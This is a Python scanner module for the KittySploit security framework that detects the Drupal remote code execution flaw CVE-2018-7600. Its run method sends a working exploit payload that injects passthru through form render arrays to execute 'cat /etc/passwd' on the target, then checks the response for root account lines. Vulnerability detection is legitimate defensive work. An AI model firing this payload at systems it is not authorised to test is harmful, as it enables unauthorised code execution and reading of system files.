#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drupal before 7."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drupal - Remote Code Execution Detection',
        'description': 'Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'modules': [
            'exploits/http/drupal_rce',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'drupal', 'rce', 'kev', 'vulhub', 'intrusive', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7600',
            'https://www.drupal.org/sa-core-2018-002',
            'https://groups.drupal.org/security/faq-2018-002',
            'http://www.securitytracker.com/id/1040598',
        ],
        'cve': 'CVE-2018-7600',
    }

    def run(self):
        path = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'application/json', 'Referer': '{{Hostname}}/user/register', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'multipart/form-data; boundary=---------------------------99533888113153068481322586663'}, data='-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name="mail[#post_render][]"\n\npassthru\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name="mail[#type]"\n\nmarkup\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name="mail[#markup]"\n\ncat /etc/passwd\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name="form_id"\n\nuser_register_form\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name="_drupal_ajax"\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Drupal - Remote Code Execution detected', path=path)
            return True
        return False

